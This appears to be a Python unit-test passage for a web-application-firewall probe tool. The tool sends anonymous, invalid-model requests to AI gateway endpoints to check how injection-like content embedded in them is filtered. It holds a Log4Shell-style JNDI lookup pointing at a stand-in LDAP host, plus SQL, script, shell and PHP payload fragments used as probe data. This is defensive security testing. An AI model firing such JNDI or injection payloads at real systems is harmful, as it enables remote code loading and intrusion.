            self.assertNotIn(case.path, {"/models/azure-speech/v1/synthesize", "/models/azure-speech/v1/recognize", "/tools/documents/v1/analyze", "/api/tools/documents"})
            self.assertFalse({name.lower() for name, _ in case.headers} & {"api-key", "authorization", "cookie"})
            if case.category.startswith("extended-content-jndi-"):
                self.assertEqual(case.intent, "compatibility")
                self.assertIn(literal.encode(), case.body)
                self.assertFalse(case.query)
            elif case.category == "data-query-name-collision-jndi":
                self.assertEqual(case.intent, "validation")
                self.assertEqual(case.query[0][1], literal)
                self.assertNotIn("[]", case.query[0][0])
                self.assertNotIn("*", case.query[0][0])
                self.assertNotIn(literal.encode(), case.body)
            elif case.category == "data-query-key-collision-jndi":
                self.assertEqual(case.intent, "validation")
                self.assertIn(literal, case.query[0][0])
                self.assertEqual(case.query[0][1], "Synthetic value")
                self.assertNotIn(literal.encode(), case.body)
            else:
                self.assertEqual(case.intent, "attack_control")
        question = next(case for case in collisions if case.payload_field == "questions.*.criteria.*")
        self.assertEqual(question.query[0][0], "questions.q.criteria.a")
        multipart = next(case for case in data if case.payload_field == "input.text")
        input_part = multipart.body.split(b'name="input"\r\n\r\n', 1)[1].split(b"\r\n--waf-probe-fixed-boundary", 1)[0]
        self.assertEqual(json.loads(input_part)["text"], literal)
        for case in cases:
            if case.category == "jndi-field-control-unknown" and dict(case.headers)["Content-Type"] == "application/json":
                self.assertEqual(json.loads(case.body)["_attack"], literal)
        self.assertEqual({case.payload_field for case in cases if case.path == "/waf-probe/jndi-nonexistent"}, {"query:metadata", "header:Referer"})

    def test_jndi_history_covers_equivalent_tools_and_missing_free_text_fields(self):
        literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
        cases = [case for case in probe.jndi_field_probes(self.routes)
                 if case.category == "extended-content-jndi-ai-history"]
        self.assertLessEqual(len(cases), 50)
        expected = {
            "/models/openai/v1/responses": {"input[].arguments", "input[].output[].text", "input[].input",
                "input[].content", "tools[].parameters", "input[].tools[].tools[].description",
                "input[].tools[].tools[].parameters", "input[].tools[].tools[].format.definition",
                "input[].summary[].text", "input[].content[].refusal", "text.format.description",
                "tools[].output_schema.properties.sample.description", "input[].tools[].description",
                "input[].tools[].format.definition", "input[].tools[].parameters.properties.sample.description",
                "input[].tools[].output_schema.properties.sample.description",
                "input[].tools[].tools[].output_schema.properties.sample.description", "input[].arguments.query",
                "input[].action.command[]", "input[].action.commands[]", "input[].operation.diff",
                "input[].output[].stdout", "input[].output[].stderr"},
            "/models/openai/v1/chat/completions": {"functions[].description", "functions[].parameters",
                "messages[].function_call.arguments", "messages[].tool_calls[].custom.input",
                "tools[].custom.description", "tools[].custom.format.grammar.definition",
                "response_format.json_schema.schema", "messages[].content", "messages[].content[].text",
                "messages[].refusal", "messages[].content[].refusal", "prediction.content",
                "prediction.content[].text", "response_format.json_schema.description",
                "messages[].reasoning_content"},
        }
        for path, fields in expected.items():
            self.assertTrue(fields <= {case.payload_field for case in cases if case.path == path})
        output = next(case for case in cases if case.payload_field == "input[].output[].text")
        history = json.loads(output.body)["input"]
        self.assertEqual(history[1]["call_id"], history[2]["call_id"])
        self.assertEqual(history[2]["output"], [{"type": "input_text", "text": literal}])
        arguments = next(case for case in cases if case.payload_field == "input[].arguments")
        history = json.loads(arguments.body)["input"]
        self.assertEqual(json.loads(history[1]["arguments"]), {"source": literal})
        self.assertNotIn(literal, history[2]["output"])
        for field in ("messages[].content", "messages[].content[].text"):
            output = next(case for case in cases if case.payload_field == field)
            history = json.loads(output.body)["messages"]
            self.assertEqual(history[2]["role"], "tool")
            self.assertEqual(history[1]["tool_calls"][0]["id"], history[2]["tool_call_id"])
            expected_content = literal if field == "messages[].content" else [{"type": "text", "text": literal}]
            self.assertEqual(history[2]["content"], expected_content)
        for case in cases:
            self.assertEqual(json.loads(case.body)["model"], probe.INVALID_MODEL)
            self.assertEqual(case.auth_mode, "anonymous")
        legacy = next(case for case in cases if case.payload_field == "functions[].description")
        self.assertEqual(json.loads(legacy.body)["functions"][0]["parameters"], {"type": "object", "properties": {}})
        response_route = next(route for route in self.routes if route.path == "/models/openai/v1/responses")
        self.assertTrue(probe.jndi_field_probes([response_route]))

    def test_jndi_dynamic_keys_are_data_keys_in_all_schemas_and_decision_objects(self):
        literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
        corpus = probe.jndi_field_probes(self.routes)
        cases = [case for case in corpus
                 if case.category == "extended-content-jndi-dynamic-keys"]
        expected = {
            "/models/openai/v1/responses": {"keys:text.format.schema.properties", "keys:tools[].parameters.properties",
                "keys:input[].tools[].tools[].parameters.properties", "keys:tools[].output_schema.properties",
                "keys:input[].tools[].parameters.properties", "keys:input[].tools[].output_schema.properties",
                "keys:input[].tools[].tools[].output_schema.properties", "keys:input[].arguments"},
            "/models/openai/v1/chat/completions": {"keys:response_format.json_schema.schema.properties",
                "keys:tools[].function.parameters.properties", "keys:functions[].parameters.properties"},
            "/models/microsoft-decision/v1/systemone": {"keys:questions", "keys:state"},
            "/api/models/decision": {"keys:questions", "keys:state"},
        }
        self.assertEqual(len(cases), 21)
        for path, fields in expected.items():
            self.assertEqual({case.payload_field for case in cases if case.path == path}, fields)
        collisions = [case for case in corpus if case.category == "data-query-key-collision-jndi"]
        self.assertEqual({(case.path, case.payload_field) for case in collisions},
                         {(case.path, case.payload_field) for case in cases})
        def literal_locations(value, path=""):
            keys, values = [], []
            if isinstance(value, dict):
                for name, child in value.items():
                    if name == literal:
                        keys.append(path)
                    child_keys, child_values = literal_locations(child, path + "." + name if path else name)
                    keys.extend(child_keys)
                    values.extend(child_values)
            elif isinstance(value, list):
                for child in value:
                    child_keys, child_values = literal_locations(child, path + "[]")
                    keys.extend(child_keys)
                    values.extend(child_values)
            elif value == literal:
                values.append(path)
            return keys, values
        for case in cases:
            keys, values = literal_locations(json.loads(case.body))
            self.assertEqual(keys, [case.payload_field.removeprefix("keys:")])
            self.assertFalse(values)
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertFalse(case.query)

    def test_jndi_cli_dry_run_selects_only_the_standalone_corpus(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "jndi-plan.json"
            with patch.object(probe, "run_probe", side_effect=AssertionError("network attempted")):
                code = probe.main(["--jndi-fields-only", "--dry-run", "--output", str(output)])
            self.assertEqual(code, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(report["selected_case_count"], len(probe.jndi_field_probes(self.routes)))
            self.assertTrue(all("jndi" in item["case_id"] for item in report["results"]))

    def test_ai_coding_corpus_is_bounded_anonymous_and_keeps_its_controls(self):
        cases = probe.ai_coding_probes(self.routes)
        self.assertLessEqual(len(cases), 288)
        self.assertGreater(len(cases), 60)
        self.assertEqual([case.case_id for case in cases], [case.case_id for case in probe.ai_coding_probes(self.routes)])
        self.assertEqual(len(cases), len({case.case_id for case in cases}))
        self.assertTrue(all(case.auth_mode == "anonymous" for case in cases))
        self.assertTrue(all(case.target == "gateway" and case.method == "POST" for case in cases))
        self.assertTrue(all(json.loads(case.body)["model"] == probe.INVALID_MODEL
                            for case in cases if case.payload_field != "model"))
        self.assertLess(max(len(case.body) for case in cases), 16384)
        for _, path in probe.CANARY_ROUTES:
            selected = [case for case in cases if case.path == path or case.path == path + "/neighbor"]
            controls = {case.category for case in selected if case.intent == "attack_control"}
            expected_controls = {"ai-coding-control-unknown-sqli", "ai-coding-control-unknown-xss",
                "ai-coding-control-query-sqli", "ai-coding-control-neighbor-xss",
                "ai-coding-control-model-sqli", "ai-coding-control-header-xss"}
            if path.endswith("/responses"):
                expected_controls |= {"ai-coding-control-arguments-sibling", "ai-coding-control-schema-sibling"}
                expected_controls |= {"ai-coding-control-native-" + name + "-sibling"
                                      for name in ("command", "commands", "diff", "stdout", "stderr")}
            else:
                expected_controls.add("ai-coding-control-reasoning-sibling")
            self.assertEqual(controls, expected_controls)
            for case in selected:
                if "query-collision" in case.category:
                    self.assertEqual(case.intent, "validation")
                    self.assertEqual(case.query[0][1], probe.CONTROL_SQL)
                if case.intent == "compatibility":
                    self.assertIn((case.method, case.path), probe.CANARY_ROUTES)
            for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
                family_cases = [case for case in selected if case.category.startswith("ai-coding-" + family + "-")]
                self.assertEqual(len(family_cases), 26 if path.endswith("/responses") else 11)
                self.assertTrue(all(case.intent == "compatibility" for case in family_cases))
        with self.assertRaisesRegex(ValueError, "exactly"):
            probe.ai_coding_probes([route for route in self.routes if not route.path.endswith("/responses")])

    def test_ai_coding_responses_history_uses_native_content_arrays_and_matched_tool_calls(self):
        cases = [case for case in probe.ai_coding_probes(self.routes) if case.path.endswith("/responses")]
        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
            output = next(case for case in cases if case.category == "ai-coding-" + family + "-tool-parts")
            history = json.loads(output.body)["input"]
            call, result = history[1:3]
            self.assertEqual(call["type"], "function_call")
            self.assertEqual(result["type"], "function_call_output")
            self.assertEqual(call["call_id"], result["call_id"])
            self.assertIsInstance(result["output"], list)
            self.assertEqual(result["output"][0]["type"], "input_text")
            self.assertEqual(history[-1]["role"], "user")
            self.assertEqual(output.payload_field, "input[].output[].text")
            custom = next(case for case in cases if case.category == "ai-coding-" + family + "-custom-input")
            history = json.loads(custom.body)["input"]
            self.assertEqual([item["type"] for item in history[1:3]], ["custom_tool_call", "custom_tool_call_output"])
            self.assertEqual(history[1]["call_id"], history[2]["call_id"])
            self.assertIsInstance(history[1]["input"], str)
        php = next(case for case in cases if case.category == "ai-coding-php-variable-function-tool-parts")
        self.assertIn('$formatter("SYNTHETIC")', json.loads(php.body)["input"][2]["output"][0]["text"])

    def test_reasoning_refusal_prediction_and_schema_descriptions_use_native_shapes(self):
        for build, summaries in ((probe.ai_coding_probes, 5), (probe.jndi_field_probes, 1)):
            cases = build(self.routes)
            selected = [case for case in cases if case.intent == "compatibility"
                        and case.payload_field == "input[].summary[].text"]
            self.assertEqual(len(selected), summaries)
            for case in selected:
                body = json.loads(case.body)
                reasoning = body["input"][0]
                self.assertEqual(reasoning["type"], "reasoning")
                self.assertEqual(reasoning["summary"][0]["type"], "summary_text")
                self.assertTrue(reasoning["summary"][0]["text"])
                self.assertEqual(body["model"], probe.INVALID_MODEL)
                self.assertEqual(case.auth_mode, "anonymous")

        cases = probe.ai_coding_probes(self.routes)
        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
            selected = [case for case in cases if case.category.startswith("ai-coding-" + family + "-")]
            responses = [case for case in selected if case.path.endswith("/responses")]
            chat = [case for case in selected if case.path.endswith("/chat/completions")]
            source = json.loads(next(case for case in responses if case.payload_field == "input").body)["input"]
            summary = next(case for case in responses if case.payload_field == "input[].summary[].text")
            self.assertEqual(json.loads(summary.body)["input"][0]["summary"], [{"type": "summary_text", "text": source}])
            content = next(case for case in responses if case.category.endswith("-reasoning-content"))
            self.assertEqual(json.loads(content.body)["input"][0]["content"], [{"type": "reasoning_text", "text": source}])
            for collection, field in ((responses, "input[].content[].refusal"), (chat, "messages[].content[].refusal")):
                refusal = json.loads(next(case for case in collection if case.payload_field == field).body)
                message = refusal["input" if collection is responses else "messages"][0]
                self.assertEqual(message["role"], "assistant")
                self.assertEqual(message["content"], [{"type": "refusal", "refusal": source}])
            refusal = json.loads(next(case for case in chat if case.payload_field == "messages[].refusal").body)
            self.assertEqual(refusal["messages"][0]["refusal"], source)
            self.assertIsNone(refusal["messages"][0]["content"])
            for field, expected in (("prediction.content", source),
                                    ("prediction.content[].text", [{"type": "text", "text": source}])):
                prediction = json.loads(next(case for case in chat if case.payload_field == field).body)["prediction"]
                self.assertEqual(prediction, {"type": "content", "content": expected})
            description = json.loads(next(case for case in responses if case.payload_field == "text.format.description").body)
            self.assertEqual(description["text"]["format"]["description"], source)
            self.assertEqual(description["text"]["format"]["schema"], {"type": "object", "properties": {}})
            description = json.loads(next(case for case in chat if case.payload_field == "response_format.json_schema.description").body)
            self.assertEqual(description["response_format"]["json_schema"]["description"], source)

    def test_direct_tool_definitions_object_arguments_and_output_schemas_are_isolated_data(self):
        cases = probe.ai_coding_probes(self.routes)
        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
            selected = [case for case in cases if case.path.endswith("/responses")
                        and case.category.startswith("ai-coding-" + family + "-")]
            source = json.loads(next(case for case in selected if case.payload_field == "input").body)["input"]
            for label, tool_type in (("direct-function-description", "function"),
                                     ("direct-custom-description", "custom"),
                                     ("namespace-description", "namespace")):
                case = next(case for case in selected if case.category.endswith("-" + label))
                history = json.loads(case.body)["input"]
                self.assertEqual(history[0]["call_id"], history[1]["call_id"])
                self.assertEqual(history[1]["tools"][0]["type"], tool_type)
                self.assertEqual(history[1]["tools"][0]["description"], source)
            grammar = next(case for case in selected if case.payload_field == "input[].tools[].format.definition")
            self.assertEqual(json.loads(grammar.body)["input"][1]["tools"][0]["format"],
                             {"type": "grammar", "syntax": "regex", "definition": source})
            arguments = next(case for case in selected if case.payload_field == "input[].arguments.query")
            history = json.loads(arguments.body)["input"]
            self.assertEqual(history[0]["arguments"], {"query": source})
            self.assertEqual(history[0]["call_id"], history[1]["call_id"])
            for label, nested in (("direct-output-schema", False), ("nested-output-schema", True)):
                case = next(case for case in selected if case.category.endswith("-" + label))
                tool = json.loads(case.body)["input"][1]["tools"][0]
                if nested:
                    tool = tool["tools"][0]
                self.assertEqual(tool["output_schema"]["properties"]["sample"]["description"], source)
                self.assertEqual(tool["parameters"], {"type": "object", "properties": {}})
            output = next(case for case in selected if case.payload_field == "tools[].output_schema.properties.sample.description")
            self.assertEqual(json.loads(output.body)["tools"][0]["output_schema"]["properties"]["sample"]["description"], source)

        keys = [case for case in cases if case.payload_field.startswith("keys:")]
        self.assertEqual(len(keys), 11)
        for case in keys:
            self.assertEqual(case.intent, "compatibility")
            self.assertEqual(json.loads(case.body)["model"], probe.INVALID_MODEL)
        for suffix, field in (("arguments-sibling", "argumentsExtra"), ("schema-sibling", "parametersExtra")):
            control = next(case for case in cases if case.category == "ai-coding-control-" + suffix)
            body = json.loads(control.body)
            target = body["input"][0] if field == "argumentsExtra" else body["input"][0]["tools"][0]
            self.assertEqual(target[field], probe.CONTROL_SQL)
            self.assertEqual(control.intent, "attack_control")
        for case in cases:
            if case.category == "ai-coding-control-model-sqli":
                self.assertEqual(json.loads(case.body)["model"], probe.CONTROL_SQL)
            if case.category.startswith("ai-coding-query-key-collision-"):
                self.assertEqual(case.intent, "validation")
                self.assertTrue(case.query[0][0].endswith("." + probe.CONTROL_SQL))
                self.assertEqual(case.query[0][1], "Synthetic value")

    def test_ai_coding_chat_history_includes_function_custom_and_legacy_tool_shapes(self):
        cases = [case for case in probe.ai_coding_probes(self.routes) if case.path.endswith("/chat/completions")]
        function = next(case for case in cases if case.category == "ai-coding-php-variable-function-function-arguments")
        history = json.loads(function.body)["messages"]
        call = history[1]["tool_calls"][0]
        self.assertEqual(call["type"], "function")
        self.assertEqual(history[2]["tool_call_id"], call["id"])
        self.assertIn('$formatter("SYNTHETIC")', json.loads(call["function"]["arguments"])["source"])
        parts = next(case for case in cases if case.category == "ai-coding-php-variable-function-tool-parts")
        tool_message = json.loads(parts.body)["messages"][2]
        self.assertEqual(tool_message["role"], "tool")
        self.assertEqual(tool_message["content"][0]["type"], "text")
        custom = next(case for case in cases if case.category == "ai-coding-php-variable-function-custom-input")
        history = json.loads(custom.body)["messages"]
        self.assertEqual(history[1]["tool_calls"][0]["type"], "custom")
        self.assertIn('$formatter("SYNTHETIC")', history[1]["tool_calls"][0]["custom"]["input"])
        self.assertEqual(history[1]["tool_calls"][0]["id"], history[2]["tool_call_id"])
        legacy = next(case for case in cases if case.category == "ai-coding-legacy-arguments")
        history = json.loads(legacy.body)["messages"]
        self.assertEqual(history[2]["role"], "function")
        self.assertEqual(history[1]["function_call"]["name"], history[2]["name"])
        self.assertIn("source", json.loads(history[1]["function_call"]["arguments"]))

    def test_native_shell_patch_history_and_deepseek_reasoning_use_inert_text_items(self):
        cases = probe.ai_coding_probes(self.routes)
        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
            selected = [case for case in cases if case.category.startswith("ai-coding-" + family + "-")]
            source = json.loads(next(case for case in selected if case.payload_field == "input").body)["input"]
            native = [case for case in selected if case.category.startswith("ai-coding-" + family + "-native-")]
            self.assertEqual(len(native), 8)
            for case in native:
                body = json.loads(case.body)
                self.assertEqual(body["model"], probe.INVALID_MODEL)
                self.assertNotIn("tools", body)
                self.assertEqual(case.auth_mode, "anonymous")
                call, output = body["input"][:2]
                self.assertEqual(call["call_id"], output.get("call_id", output.get("id")))
                if case.category.endswith("-native-local-command"):
                    self.assertEqual(call["type"], "local_shell_call")
                    self.assertEqual(call["action"], {"type": "exec", "command": ["sh", "-c", source], "env": {}})
                elif case.category.endswith("-native-shell-command"):
                    self.assertEqual(call["type"], "shell_call")
                    self.assertEqual(call["action"], {"commands": [source]})
                elif case.category.endswith(("-native-local-output", "-native-patch-output")):
                    self.assertIn(output["type"], {"local_shell_call_output", "apply_patch_call_output"})
                    self.assertEqual(output["output"], source)
                elif case.category.endswith(("-native-shell-stdout", "-native-shell-stderr")):
                    self.assertEqual(output["type"], "shell_call_output")
                    field = "stderr" if case.category.endswith("-stderr") else "stdout"
                    self.assertEqual(output["output"][0][field], source)
                    self.assertEqual(output["output"][0]["outcome"], {"type": "exit", "exit_code": 0})
                else:
                    self.assertEqual(call["type"], "apply_patch_call")
                    operation = call["operation"]
                    kind = "create_file" if case.category.endswith("-create") else "update_file"
                    self.assertEqual(operation["type"], kind)
                    self.assertEqual(operation["path"], "synthetic-probe.txt")
                    diff = "\n".join("+" + line for line in source.splitlines()) + "\n"
                    self.assertEqual(operation["diff"], diff if kind == "create_file" else "@@\n" + diff)
            reasoning = next(case for case in selected if case.payload_field == "messages[].reasoning_content")
            message = json.loads(reasoning.body)["messages"][0]
            self.assertEqual(message["role"], "assistant")
            self.assertEqual(message["content"], "Synthetic final answer")
            self.assertEqual(message["reasoning_content"], source)

        for name in ("command", "commands", "diff", "stdout", "stderr"):
            control = next(case for case in cases if case.category == "ai-coding-control-native-" + name + "-sibling")
            item = json.loads(control.body)["input"][0]
            target = item["action"] if name in {"command", "commands"} else (
                item["operation"] if name == "diff" else item["output"][0])
            expected = [probe.CONTROL_SQL] if name in {"command", "commands"} else probe.CONTROL_SQL
            self.assertEqual(target[name + "Extra"], expected)
            self.assertEqual(control.intent, "attack_control")
        sibling = next(case for case in cases if case.category == "ai-coding-control-reasoning-sibling")
        message = json.loads(sibling.body)["messages"][0]
        self.assertNotIn("reasoning_content", message)
        self.assertEqual(message["reasoning_contentExtra"], probe.CONTROL_SQL)
        self.assertEqual(sibling.intent, "attack_control")

    def test_mixed_code_keys_and_query_collisions_cover_all_eleven_data_prefixes(self):
        cases = probe.ai_coding_probes(self.routes)
        keys = [case for case in cases if case.payload_field.startswith("keys:")]
        expected = {
            "/models/openai/v1/responses": {
                "keys:text.format.schema.properties", "keys:tools[].parameters.properties",
                "keys:input[].tools[].tools[].parameters.properties", "keys:tools[].output_schema.properties",
                "keys:input[].tools[].parameters.properties", "keys:input[].tools[].output_schema.properties",
                "keys:input[].tools[].tools[].output_schema.properties", "keys:input[].arguments"},
            "/models/openai/v1/chat/completions": {
                "keys:response_format.json_schema.schema.properties",
                "keys:tools[].function.parameters.properties", "keys:functions[].parameters.properties"},
        }
        self.assertEqual(len(keys), 11)
        for path, fields in expected.items():
            self.assertEqual({case.payload_field for case in keys if case.path == path}, fields)

        def multiline_keys(value, path=""):
            found = []
            if isinstance(value, dict):
                for name, child in value.items():
                    if "\n" in name:
                        found.append((path, name))
                    found.extend(multiline_keys(child, path + "." + name if path else name))
            elif isinstance(value, list):
                for child in value:
                    found.extend(multiline_keys(child, path + "[]"))
            return found

        for case in keys:
            body = json.loads(case.body)
            found = multiline_keys(body)
            self.assertEqual(len(found), 1)
            field, source = found[0]
            self.assertEqual(field, case.payload_field.removeprefix("keys:"))
            for fragment in ("SELECT", "<script>", "$(printf synthetic)", "param($value)"):
                self.assertIn(fragment, source)
            self.assertEqual(body["model"], probe.INVALID_MODEL)
            name = field.replace("[]", "")
            collision = [item for item in cases if item.path == case.path
                         and item.category.startswith("ai-coding-query-key-multiline-collision-")
                         and item.payload_field == "query-keys:" + name]
            self.assertEqual(len(collision), 1)
            self.assertEqual(collision[0].query, ((name + "." + source, "Synthetic value"),))
            self.assertEqual(collision[0].intent, "validation")
            self.assertEqual(collision[0].auth_mode, "anonymous")
            self.assertEqual(json.loads(collision[0].body)["model"], probe.INVALID_MODEL)

    def test_ai_coding_tool_search_namespace_and_chat_grammar_use_distinct_native_schemas(self):
        cases = probe.ai_coding_probes(self.routes)
        for label in ("nested-description", "nested-schema", "nested-grammar"):
            case = next(case for case in cases if case.category == "ai-coding-" + label)
            history = json.loads(case.body)["input"]
            search, output = history[:2]
            self.assertEqual(search["type"], "tool_search_call")
            self.assertEqual(output["type"], "tool_search_output")
            self.assertEqual(search["call_id"], output["call_id"])
            namespace = output["tools"][0]
            self.assertEqual(namespace["type"], "namespace")
            self.assertEqual(len(namespace["tools"]), 1)
            child = namespace["tools"][0]
            if label == "nested-schema":
                self.assertEqual(child["parameters"]["$schema"], "https://json-schema.org/draft-07/schema#")
                self.assertIn("SELECT sample", child["parameters"]["properties"])
            if label == "nested-grammar":
                self.assertEqual(child["format"]["type"], "grammar")
                self.assertEqual(child["format"]["syntax"], "regex")
                self.assertNotIn("grammar", child["format"])
                re.compile(child["format"]["definition"])
        chat = next(case for case in cases if case.category == "ai-coding-custom-grammar")
        format_value = json.loads(chat.body)["tools"][0]["custom"]["format"]
        self.assertEqual(format_value["type"], "grammar")
        self.assertEqual(format_value["grammar"]["syntax"], "regex")
        self.assertNotIn("definition", format_value)
        re.compile(format_value["grammar"]["definition"])

    def test_ai_coding_cli_dry_run_is_separate_and_reports_no_bodies_or_secrets(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "ai-plan.json"
            with patch.object(probe, "run_probe", side_effect=AssertionError("network attempted")):
                code = probe.main(["--ai-coding-only", "--dry-run", "--case-filter", "php-variable-function",
                    "--key-file", str(Path(directory) / "missing-secret"), "--output", str(output)])
            self.assertEqual(code, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(report["selected_case_count"], 37)
            self.assertTrue(all(case["auth_mode"] == "anonymous" for case in report["results"]))
            self.assertTrue(all("body" not in case and "headers" not in case for case in report["results"]))
            self.assertNotIn('$formatter("SYNTHETIC")', json.dumps(report))
            self.assertTrue(any("not feature success" in item for item in report["limitations"]))

    def test_image_prompt_corpus_covers_only_the_published_image_routes_with_bounded_anonymous_cases(self):
        cases = probe.image_prompt_probes(self.routes)
        compatibility = [case for case in cases if case.intent == "compatibility"]
        expected = {(route.target, route.path) for route in self.routes if route.method == "POST" and (
            route.target == "gateway" and route.operation.split(":")[0] in {"openai-images-v1", "blackforest-images-v1"}
            or route.target == "portal" and route.path == "/api/models/images")}
        self.assertEqual(len(expected), 7)
        self.assertEqual({(case.target, case.path) for case in compatibility}, expected)
        self.assertEqual(len(cases), 87)
        self.assertLessEqual(len(cases), 100)
        self.assertEqual(Counter(case.intent for case in cases), {"compatibility": 52, "attack_control": 28, "validation": 7})
        self.assertLess(max(len(case.body) for case in cases), 4096)
        self.assertEqual(len(cases), len({case.case_id for case in cases}))
        self.assertEqual([case.case_id for case in cases], [case.case_id for case in probe.image_prompt_probes(self.routes)])
        self.assertTrue(all(case.auth_mode == "anonymous" and case.method == "POST" for case in cases))
        self.assertTrue(all(not any(name.lower() in {"api-key", "authorization", "cookie", "origin"} for name, _ in case.headers) for case in cases))
        self.assertTrue(all(case.category.startswith("image-prompts-") for case in cases))
        with self.assertRaisesRegex(ValueError, "six published"):
            probe.image_prompt_probes([route for route in self.routes if route.path != "/api/models/images"])

    def test_image_prompt_variants_keep_prompt_separate_from_unknown_query_and_neighbor_controls(self):
        cases = probe.image_prompt_probes(self.routes)
        baselines = [case for case in cases if case.category == "image-prompts-baseline"]
        self.assertEqual(len(baselines), 7)
        for baseline in baselines:
            path_cases = [case for case in cases if case.target == baseline.target and case.path in {baseline.path, baseline.path + "/neighbor"}]
            for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "rfi-url", "path-source"):
                matched = [case for case in path_cases if case.category == "image-prompts-" + family]
                self.assertEqual(len(matched), 1)
                self.assertEqual(matched[0].payload_field, "prompt")
                self.assertEqual(matched[0].intent, "compatibility")
            controls = {case.category for case in path_cases if case.intent == "attack_control"}
            self.assertEqual(controls, {"image-prompts-control-unknown-sqli", "image-prompts-control-unknown-xss",
                "image-prompts-control-query-sqli", "image-prompts-control-neighbor-xss"})
            collision = next(case for case in path_cases if case.category == "image-prompts-query-collision-prompt")
            self.assertEqual(collision.intent, "validation")
            self.assertEqual(collision.query, (("prompt", probe.CONTROL_SQL),))
            self.assertEqual(collision.body, baseline.body)
            neighbor = next(case for case in path_cases if case.category == "image-prompts-control-neighbor-xss")
            self.assertEqual(neighbor.path, baseline.path + "/neighbor")

    def test_image_prompt_json_uses_provider_native_fields_and_invalid_model_canaries(self):
        cases = [case for case in probe.image_prompt_probes(self.routes) if dict(case.headers)["Content-Type"] == "application/json"]
        for case in cases:
            value = json.loads(case.body)
            self.assertIsInstance(value["prompt"], str)
            self.assertNotIn("messages", value)
            if case.target == "portal":
                self.assertEqual(value["modelId"], probe.INVALID_MODEL)
                self.assertNotIn("model", value)
                portal_route = next(route for route in self.routes if route.target == "portal" and route.path == "/api/models/images")
                self.assertEqual(value["apiKeyId"], probe._json_variants(portal_route, "Synthetic image auth fixture")[0][1]["apiKeyId"])
                self.assertEqual(value["outputFormat"], "png")
            else:
                self.assertEqual(value["model"], probe.INVALID_MODEL)
                if "/blackforestlabs/" in case.path:
                    self.assertEqual(value["num_images"], 1)
                    self.assertEqual(value["output_format"], "png")
                    self.assertNotIn("n", value)
                else:
                    self.assertEqual(value["n"], 1)
        media = [case for case in cases if case.category.startswith("image-prompts-flux-base64-")]
        self.assertEqual(len(media), 3)
        for case in media:
            self.assertEqual(case.path, "/models/blackforestlabs/v1/flux-2/edits")
            self.assertEqual(case.payload_field, "input_image")
            image = json.loads(case.body)["input_image"]
            self.assertFalse(image.startswith("data:"))
            self.assertTrue(base64.b64decode(image, validate=True).startswith(b"\x89PNG\r\n\x1a\n"))

    def test_image_edit_multipart_has_valid_same_size_png_image_and_transparent_mask(self):
        cases = [case for case in probe.image_prompt_probes(self.routes) if dict(case.headers)["Content-Type"].startswith("multipart/")]
        self.assertEqual(len(cases), 36)
        for case in cases:
            message = BytesParser(policy=policy.default).parsebytes(b"MIME-Version: 1.0\r\nContent-Type: " + dict(case.headers)["Content-Type"].encode() + b"\r\n\r\n" + case.body)
            parts = {part.get_param("name", header="content-disposition"): part for part in message.iter_parts()}
            self.assertEqual(parts["model"].get_payload(decode=True).decode(), probe.INVALID_MODEL)
            self.assertNotIn("response_format", parts)
            dimensions = []
            for field_name in ("image", "mask"):
                part = parts[field_name]
                self.assertEqual(part.get_content_type(), "image/png")
                data = part.get_payload(decode=True)
                self.assertTrue(data.startswith(b"\x89PNG\r\n\x1a\n"))
                chunks = {}; offset = 8
                while offset < len(data):
                    length = int.from_bytes(data[offset:offset + 4], "big")
                    name = data[offset + 4:offset + 8]
                    payload = data[offset + 8:offset + 8 + length]
                    crc = int.from_bytes(data[offset + 8 + length:offset + 12 + length], "big")
                    self.assertEqual(crc, zlib.crc32(name + payload) & 0xffffffff)
                    chunks[name] = payload
                    offset += length + 12
                self.assertEqual(offset, len(data))
                dimensions.append(chunks[b"IHDR"][:8])
                self.assertEqual(chunks[b"IHDR"][9], 6 if field_name == "mask" else 2)
                pixels = zlib.decompress(chunks[b"IDAT"])
                self.assertEqual(pixels, b"\x00" * (5 if field_name == "mask" else 4))
                self.assertNotIn(b"$formatter", chunks[b"tEXt"])
            self.assertEqual(dimensions, [(1).to_bytes(4, "big") * 2] * 2)

    def test_image_prompt_cli_dry_run_keeps_new_corpus_separate_and_never_reads_a_key(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "image-plan.json"
            with patch.object(probe, "run_probe", side_effect=AssertionError("network attempted")):
                code = probe.main(["--image-prompts-only", "--dry-run", "--case-filter", "php-variable-function",
                    "--key-file", str(Path(directory) / "missing-secret"), "--output", str(output)])
            self.assertEqual(code, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(report["selected_case_count"], 7)
            self.assertTrue(all(case["auth_mode"] == "anonymous" for case in report["results"]))
            self.assertTrue(all("body" not in case and "headers" not in case for case in report["results"]))
            self.assertNotIn('$formatter("SYNTHETIC")', json.dumps(report))
        anonymous = next(case for case in probe.image_prompt_probes(self.routes) if case.target == "gateway")
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as send:
            record = probe.run_probe(anonymous, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4),
                key="sentinel-key-must-not-be-sent", transport="curl")
        self.assertNotIn("api-key", {name.lower(): value for name, value in send.call_args.args[2].items()})
        self.assertEqual(record["classification"], "application_rejected")
        self.assertFalse(record["functional_success"])

    def test_literal_attack_documentation_is_data_in_real_fields_never_an_xml_request(self):
        cases = probe.adversarial_content(self.routes)
        self.assertGreaterEqual(len(cases), 120)
        counts = Counter((case.target, case.path) for case in cases)
        self.assertEqual(set(counts.values()), {6})
        self.assertIn(("gateway", "/models/openai/v1/chat/completions"), counts)
        self.assertIn(("gateway", "/tools/pii-v1-mcp/mcp"), counts)
        self.assertIn(("portal", "/api/models/generate"), counts)
